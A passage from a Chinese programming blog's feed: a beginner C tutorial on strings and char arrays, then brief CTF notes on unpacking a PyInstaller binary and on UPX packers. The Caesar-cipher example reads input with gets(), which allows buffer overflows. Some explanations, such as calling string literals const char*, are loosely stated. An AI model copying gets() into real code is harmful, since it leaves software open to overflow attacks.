        <content type="html"><![CDATA[<p>提要:</p><p>本章要讲解<code>字符串</code>的内容.同时会使用到前面<code>基本输入输出</code>一章中讲解的各种<code>输入输出函数</code>和<code>数组</code>,若不了解请自行复习.</p><p>注意:</p><p>本章需要的前置知识为:</p><p>1.彻底掌握C语言单个字符(字符变量)的相关知识,如果没有掌握,请回看前面的<code>数据类型</code>一章!</p><p>2.掌握<code>一维数组</code>的相关知识,如果没有掌握,请回看前面的<code>数组</code>一章!</p><h1 id="什么是字符串">什么是字符串</h1><p>一个程序需要的不仅仅是针对问题进行计算,还需要和用户(程序的执行者)进行交互,例如在界面(控制台等)打印一个标题来显示程序名/打印一行提示等,这些信息往往都是一个个的字符,比如这一句话<code>&quot;This is a calculator&quot;</code>,就是一个由字母,空格这样一个个的字符组成的<code>序列</code>,我们称之为<code>字符串</code>.</p><p>字符串的用途很多,最显而易见的就是作为<code>和用户交互的信息</code>进行输出.</p><p>此外,字符串也可以作为程序运算的对象,例如一个用于实现凯撒密码的程序,就要对密文字符串进行加密:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">caesar</span><span class="params">(<span class="type">char</span> before_c, <span class="type">int</span> offset)</span> &#123;</span><br><span class="line">    <span class="type">int</span> c = before_c;</span><br><span class="line">    <span class="keyword">while</span> (offset &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        offset += <span class="number">26</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">islower</span>(c)) &#123;</span><br><span class="line">        c = c + offset;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;a&#x27;</span> + (c - <span class="string">&#x27;a&#x27;</span>) % <span class="number">26</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isupper</span>(c)) &#123;</span><br><span class="line">        c = c + offset;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;A&#x27;</span> + (c - <span class="string">&#x27;A&#x27;</span>) % <span class="number">26</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入明文字符串: &quot;</span>); <span class="comment">// 提示用户输入一行字符串作为明文</span></span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入偏移量: &quot;</span>); <span class="comment">// 提示用户输入一个整数作为偏移量</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;偏移后的密文为: &quot;</span>); <span class="comment">// 提示用户接下来输出的一行字符串即为加密后的密文</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isalpha</span>(str[i]))</span><br><span class="line">            <span class="built_in">putchar</span>(caesar(str[i], offset)); <span class="comment">// 使用putchar()进行输出</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">putchar</span>(str[i]); <span class="comment">// 使用putchar()进行输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231026012133913.png" alt="image-20231026012133913" style="zoom:50%;" /><p>上面这个程序就使用gets()函数输入了一个字符串(可以包含空格),然后将字符串中的字母按照输入的偏移量(可以自行百度<code>凯撒密码</code>)进行变换加密.</p><p>任何高级编程语言都有针对字符串的功能支持,我们将对C语言的实现进行详细讲解.</p><h1 id="c风格的字符串">C风格的字符串</h1><p>首先必须提出的一点是,抛开平时简单的代码不谈,实际情况下,几乎所有的关于字符串的处理都不是什么易事.</p><p>这里说的处理不单单是对字符串进行替换,连接,删除等操作,更复杂的是面对用户时如何的正确处理输入输出.</p><p>初学者可能会在scanf,printf这两个函数上耗费大量的时间,不要紧,这两个函数没有那么难.</p><p>这一段内容的前置知识要求彻底掌握C语言单个字符的相关知识,如果没有掌握,请回看前面的<code>数据类型</code>一章!</p><h2 id="字符串常量">字符串常量</h2><p>如果我们仅仅是想要一个不变的字符串,可以使用字符串常量.</p><p>C语言中,字符串是由一对<code>&quot;&quot;</code>和其包括起来的任意数量的字符组成.</p><p>例如,我们想要表示<code>Hello world!</code>这行字符串,就是这么写:</p><p><code>&quot;Hello world!&quot;</code></p><p>任何可以放到char变量中的字符,都可以出现在字符串中,需要注意的是:</p><p><code>转义字符</code>依旧需要在字符串中转义,它和单个字符相同,只不过是和其他字符紧挨着放在一起了而已:</p><p><code>&quot;hello\nwelcome!&quot;</code>这个字符串中的换行符<code>'\n'</code>尽管和其他字符连在一起,但是不影响C语言识别出它.</p><h2 id="printf的第一个参数">printf的第一个参数</h2><p>前面讲过,使用<code>printf()</code>函数,我们可以直接输出一个字符串常量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello user1\n&quot;</span>); <span class="comment">// 现在我们知道,&quot;Hello user1\n&quot;就是一个字符串了</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在之前,我们仅仅知道使用printf时,括号里第一个部分需要加上双引号,现在我们知道了,它是一个字符串.</p><p>前面所说的这是一个&quot;格式化字符串&quot;,代表的是这个字符串的功能,其中形如<code>%d</code>,<code>%s</code>,<code>%lf</code>这样的字符组合并不是<code>转义字符</code>,而仅仅是在printf内部用于识别处理后面参数.</p><h2 id="字符串的长度和占用空间">字符串的长度和占用空间</h2><p>假设我们有如下字符串:</p><p><code>&quot;hello world!\n&quot;</code></p><p>1.那么这个字符串的长度是多少?</p><p>显然,可见字符有13个: 10个字母+1个标点+2个空白字符(中间的空格和末尾的换行)</p><p>所以这个字符串的长度为13.</p><p>2.那么存储这个字符串需要多少空间呢?(以字节为单位)</p><p>实际上,一个字符占用一个字节,那么13个字符就占用13个字节,但是问题并没有那么简单,事实上,我们需要14个字节去存储它.</p><p>因为一个字符串必须要有一个结束标志,来代表这个字符串到达结尾.那么C语言中,这个标志就是所谓的零字符<code>'\0'</code>,注意和<code>'0'</code>区分!<code>'\0'</code>实际上就是一个0(只不过是一个字节),所以有时候我们也可以使用0来简写.</p><p>可以这样理解:为了取消特殊性,<code>'\0'</code>仍然是一个字符,这是一个转义字符,为了和字符<code>'0'</code>区别.</p><p>它同样占用一个字节,所以整个字符串需要14个字节去存储!</p><p>后面我们会讨论字符串的访问溢出问题.</p><h2 id="字符串常量的使用问题">字符串常量的使用问题</h2><p>1.能否拼接?</p><p>字符串<code>&quot;Hello user1\n&quot;</code>由如下若干个字符连接而成:</p><p><code>'H','e','l','l','o',' ','u','s','e','r','1','\n'</code></p><p>但是遗憾的是,我们并不能将其使用<code>+运算符</code>进行拼接—读者可能使用过其他的一些语言,例如python,JavaScript,它们是可以使用<code>+运算符</code>拼接字符串的,因为他们将<code>字符串</code>视为一个<code>对象</code>!然而C语言作为一门面向过程的语言,自然是对此没有支持.</p><p>2.可以用单引号?</p><p>更为错误的是,我们必须使用<code>&quot;&quot;</code>,而不是<code>''</code>来包括一个字符串,字符和字符串是不一样的—字符属于基本类型,而C语言没有任何基本类型来直接存储字符串!</p><p>3.不是对象,那它是什么?</p><p>这里可能有点&quot;超纲&quot;,但是有必要指出,C语言中的字符串常量的<code>类型</code>是一个字符指针(指向的空间内容为const),这个字符指针的值为字符串中第一个字符的存储地址!</p><p>例如<code>&quot;hello world&quot;</code>,我们对其进行使用的时候,实际上我们仅仅是获取到了这个字符串常量的指针(地址)而已,也就是<code>'h'</code>的存储地址,常量字符串存储在常量区,我们不能对其进行修改.</p><p>同样很无奈,想要深入探索这个问题,必须等到后面讲解到指针才行.</p><p>4.字符串怎么修改?</p><p>第3点中指出,字符串常量是无法被修改的,因为其类型为<code>const char*</code>,更根本的原因是它存储在内存的常量区,修改它的结果是不确定的,甚至会导致程序直接崩溃.</p><p>那么如何使用可修改的字符串呢,下面来讲解.</p><h2 id="可修改的字符串">可修改的字符串</h2><p>尽管字符串很重要,但是很遗憾的是,C语言并没有任何专门存储字符串的数据类型,因为C太过底层.</p><p>我们分析一下字符串的结构就可以看出,实际上每一个字符都单独地占用一个字节(暂时仅仅考虑英文字符集),并且这些字符都是连续排列的,直到遇到一个<code>'\0'</code>结束,也就是末尾一个字节是全0.</p><p>那么我们很容易想到,我们可以利用C语言的数组来进行存储一个字符串,仅需要将数组的元素类型设置为char即可:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">15</span>] = <span class="string">&quot;Hello world!&quot;</span>; <span class="comment">// 不知道为什么可以这样初始化的请回顾前面数组的知识</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str); <span class="comment">// %s代表接受一个字符指针,这个字符指针指向一个字符串</span></span><br><span class="line">    <span class="comment">// 这里直接写字符数组的数组名即可,同样,详细原因--&gt;见指针</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用一个存储char类型元素的数组来存储这个字符串,C语言提供了一种方便的写法,可以使用一个字符串常量对其进行初始化,这样,我们就得到了这个字符串常量的一个副本,将其存储在str数组中.</p><p>我们当然也可以这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">15</span>] = &#123;</span><br><span class="line">            <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>显然这种方法不如第一种方便,最后面的<code>'\0'</code>可省略,但是不建议,显式加上字符串结束符是一个好习惯.</p><p>同样,尽管我们这样使用数组来存储一个字符串,但是他还是一个数组,这意味着我们可以使用一切数组的用法来对其进行操作,例如我们可以使用下标的方式获取到某一个字符,并且对其进行修改,十分简单,读者请自行尝试.</p><h1 id="重点-数组的问题">重点:数组的问题</h1><h2 id="数组的大小和溢出">数组的大小和溢出</h2><p>一定要注意的是,字符串后面会有一个<code>'\0'</code>结束符,它必须纳入数组长度的考虑,例如,我们至少需要:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">14</span>] = <span class="string">&quot;hello world!\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>我们如果使用<code>printf(&quot;%s&quot;, str);</code>对其进行输出,结果是这样的:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028020751640.png" alt="image-20231028020751640" style="zoom:50%;" /><p>没有问题,最后会有一个换行.但是,如果我们仅仅考虑了字符串的长度13,结果就会变得十分意外:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">13</span>] = <span class="string">&quot;hello world!\n&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br></pre></td></tr></table></figure><p>运行结果是这样的:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028020918221.png" alt="image-20231028020918221" style="zoom:50%;" /><p>可以发现,在正常输出了原来的字符后,末尾又输出了一些奇怪的字符,这意味着在访问数组时,并没有访问到<code>'\0'</code>—由于数组长度太短,没能够存储进去,这就导致字符数组中仅仅保存了前面的字符,而没有正确的结束标志.</p><p>这样的后果就是,当字符串在输出时,会一直向后访问,直到在相邻的内存中遇到一个全0的字节!</p><p>进一步,如果我们多次运行这个程序呢?结果会是一样的吗?</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028021234520.png" alt="image-20231028021234520" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028021244512.png" alt="image-20231028021244512" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028021256848.png" alt="image-20231028021256848" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028021306320.png" alt="image-20231028021306320" style="zoom:50%;" /><p>可以发现,后面输出的乱码完全是随机的,事实上,这个程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">13</span>] = <span class="string">&quot;hello world!\n&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们对其进行输出,已经发生了<code>栈溢出</code>,非要深究的话,我们前面输出的那些乱码全部都是程序运行时栈的内容,由于str是局部变量,所以它在main函数的栈中分配,我们访问到数组末尾,并没有发现结束符,printf就会错误地认为字符串并没有结束,进而继续向后访问(实际上是继续<code>向下</code>访问更高地址的数据,因为堆栈是从高地址向低地址增长)</p><p>每次程序运行,调用栈的相关数据都是不一样的,因为操作系统(这里是Windows)每次运行这个程序,都会为其分配不同位置的内存,这就导致每次错误访问到的数据不同.</p><p>总之,在使用字符数组来保存字符串的时候,千万要注意数组的长度,确保至少能刚好存下这个字符串.</p><p>然而,我们知道声明数组时,有时可以省略长度,只要我们对其进行了初始化,这意味着我们可以让编译器自动计算长度:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;hello world!\n&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028022323391.png" alt="image-20231028022323391" style="zoom:50%;" /><p>这样没有任何问题,如不理解请复习<code>数组</code>.</p><h2 id="再探ascii码-char和中文">再探ASCII码-char和中文</h2><h3 id="char的符号">char的符号</h3><p>前面讲解过,char变量存储的实际上是一个字符的ASCII码,其值范围是0~127.</p><p>但是char是一个字节,意味着有8位,如果按照无符号去存,范围是0~255,显然多了一倍.相反地,如果按照有符号去存,其值范围为-128~127.同样的8个二进制位以不同的解释方式去处理,结果是不同的.</p><p>显然,上面这两种情况分别对应的<code>unsigned char</code>和<code>signed char</code>,这两种类型和<code>char</code>类型并不相同,它们互相独立.也许我解释的不够明确,<code>标准</code>如此说:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028144837886.png" alt="image-20231028144837886"></p><p>重点是第3点.它指出,标准并未规定<code>char</code>必须和这两种解释方式(有符号和无符号)中的某一种等价.标准将这个问题交给具体的实现(C编译器的编写者)来处理,不同的实现可能不同,但是大多数情况下,<code>char</code>往往是有符号的,也就是说它和<code>signed char</code>等价.</p><p>从现在开始,本教程默认<code>char</code>类型和<code>signed char</code>等价,亦即认为char有符号.</p><h3 id="溢出问题">溢出问题</h3><p>尽管char类型一般被解释为有符号的,但是不影响其8位仍然有256种状态,我们其实将负数全部舍弃不用,仅仅使用正数部分即可表示所有的ASCII码.</p><p>但是,这又牵扯出一个溢出问题—尽管我们原则上不使用负数,但是仍然有可能无意或有意地把一个char变量变成负数.</p><br><p>例如,字符’A’对应ASCII码65,我们对其加32,让其变成97,也就是’a’,这就实现了大小写转换.</p><p>但是,如果我们&quot;意外地&quot;(有意地)对其加了100,那么实际上结果并不是165,而是-91.</p><p>这里发生了一个<code>上溢</code>,由于计算机中整数加法实际上是补码加法,存在正溢出和负溢出,简单的说就是当数值超出了能够表示的上界和下界,就会从下界和上界进行回绕,溢出了多少就绕回多少.</p><p><code>165</code>比char的<code>上界127</code>多出了38,则从<code>下界-128</code>回绕38,-128视为已经回绕了1,那么就要从-128再加上37,最后的结果就是<code>-91</code>.</p><p>下溢也是同理,总之,对于正常的英文字符而言,溢出到了负数意味着不是一个合法的字符,对其强行进行解释也只会显示一个乱码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> a = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    a += <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">putchar</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028151824408.png" alt="image-20231028151824408" style="zoom:50%;" /><h3 id="非英文字符集支持">非英文字符集支持</h3><p>当然,并不是所有的字符全部都是英文的,这时候,ASCII码便不再适用,因为,此时想要正确表示一个字符,可能需要2个字节,甚至3到4个字节才能够保存.</p><p>例如在GBK编码中,一个中文字符需要两个字节才能存储,更为通用的UTF8编码中,则需要3个字节!</p><p>必须提前说明,Windows默认编码为GBK2312,而更加通用的字符集则是UFT8,这两种编码互不兼容,读者如果要在程序中加入中文字符(其他非英文字符同理),一定要注意编码的统一!</p><p>大部分初学者都是使用windows,所以各位的程序中的中文字符一般都是GB2312(或GBK),而许多软件(例如VSCode)内置的运行终端默认的编码都是UTF8,这就往往会导致新手最头疼的乱码问题.</p><p>解决的办法一般有两种思路:</p><ol><li>将终端的编码设置为gbk,与源代码一起全部统一为GBK.</li><li>将源代码转换为UTF8,一起统一为UFT8.</li></ol><p>读者可以自行百度不同软件的解决方案,笔者这里使用了一个不是很好的方法:开启windows的全局UTF8支持,这样就解决了乱码问题,但是新问题就是,许多朋友的代码都是gbk,直接运行就会导致乱码,而且chcp 936也无可奈何,暂时还未解决.</p><p>所以还是建议去将软件的终端改为GBK相对会好一点.</p><p>但是Linux默认UFT8…这就很难受…</p><br><p>另一方面,由于中文字符不能单靠一个字符去存储,C标准定义了<code>wchar_t</code>这些类型来支持宽字符,这里就不介绍了,因为用起来有点麻烦.</p><p>我们对于中文字符,可以直接存入字符串,尽管一个char不能保存一个中文字符,但是2个(甚至是3个)连在一起就可以实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">15</span>] = <span class="string">&quot;你好 世界!&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); <span class="comment">// 输出这个字符串</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, str[i]); <span class="comment">// 遍历数组的每一个字符,以十进制整数输出其ASCII码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028153616753.png" alt="image-20231028153616753"></p><p>可以看出,除了中间的空格和末尾的感叹号外,其他的字符都不是合法的ASCII字符—它们都是各个中文字符的一部分.</p><p>再例如,我们如果这样写代码,是可以输出一个正确的中文字符的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>, <span class="number">-28</span>, <span class="number">-67</span>, <span class="number">-96</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028153807346.png" alt="image-20231028153807346" style="zoom:50%;" /><p>这3个字符组合起来就是一个完整的<code>'你'</code>,当然,这样写仅仅是作为一个示例而已.</p><br><p>掌握了如何使用字符串,我们就可以编写出更加人性化的程序,为用户提供更多的提示信息;不仅如此,我们还为编写字符处理程序打下了基础.</p><br><br><p>上一篇:<a href="../2023-10-20-b7fda0df05ff">C语言教程-10-数组</a></p><p>下一篇:<a href="../2023-10-31-82eafac4349b">C语言教程-12_1-初识函数</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python逆向</title>
      <link href="/2023-10-04-3bd922fcbb74/"/>
      <url>/2023-10-04-3bd922fcbb74/</url>
      
        <content type="html"><![CDATA[<h1 id="pyinstaller打包">pyinstaller打包</h1><h2 id="例题-羊城杯-2020-login">例题-<a href="https://www.ctfer.vip/problem/1417">[羊城杯 2020]login</a></h2><p>DIE发现有Pyinstaller的打包</p><p>Github下载<code>pyinstxtractor.py</code>,然后直接使用下面的命令解包题目的login.exe即可(无加密)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004165414348.png" alt="image-20231004165414348"></p><p>源文件在这里:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231004165432753.png" alt="image-20231004165432753" style="zoom:40%;" /><p>打开分析,使用z3进行解密即可(注意有一些故意打乱).</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加壳技术</title>
      <link href="/2023-10-02-54ac25179ed3/"/>
      <url>/2023-10-02-54ac25179ed3/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是壳">什么是壳</h1><p>壳是一种概念上的东西,我们的程序如果直接运行,可能会面临各种问题,例如我们需要防止程序被简单地反编译甚至被篡改.壳最初就是用于实现保护的这样的一种特殊程序.</p><p>相当于在我们原本的程序外加了一个特殊的壳程序,来保护我们原本的程序,壳在后面的发展中功能逐渐变化,也就出现了不同种类的壳.</p><p>大致有压缩壳,加密壳,VM壳的分类.</p><p>压缩壳主要用于较小软件的大小;加密壳用于保护软件,例如对数据/代码进行加密,以防止简单的静态分析破解等;VM壳利用了虚拟机技术,可以有效保护代码,但是牺牲了效率,所以往往出现在关键代码部分.</p><p>CTF中,可以使用DIE(Detect It Eazy)等软件对二进制程序进行检测,一般可以查出是否加壳.</p><h1 id="压缩壳">压缩壳</h1><p>压缩壳的侧重点就是减小软件体积大小,加密保护并不是其重点.</p><p>常见的压缩壳有UPX,aspack,fsg,Aspack Scrambler,ExeStealth, n Protector,V2Packer,WWPack32,XComp0.98, BeRoEXEPacker,dePACK,ExeShield Protector,KByS,NsPacK,tElock, Nspack PECompect Petite winUpack</p><h2 id="upx">UPX</h2><h3 id="加壳">加壳</h3><p>该项目开源,并且几乎不带有任何反调试或保护策略.</p><p>可以在UPX官网下载UPX程序进行加壳/脱壳.</p><p>官网:</p><p><a href="https://upx.github.io/">https://upx.github.io/</a></p><p>使用方法:</p><p><code>upx [-命令] [-选项] [-o 目标文件] 源文件..</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">whh@whh-virtual-machine:~/do$ ./upx</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2023</span><br><span class="line">UPX 4.2.0       Markus Oberhumer, Laszlo Molnar &amp; John Reiser    Aug 8th 2023</span><br><span class="line"></span><br><span class="line">Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file..</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  -1     compress faster                   -9    compress better</span><br><span class="line">  -d     decompress                        -l    list compressed file</span><br><span class="line">  -t     test compressed file              -V    display version number</span><br><span class="line">  -h     give 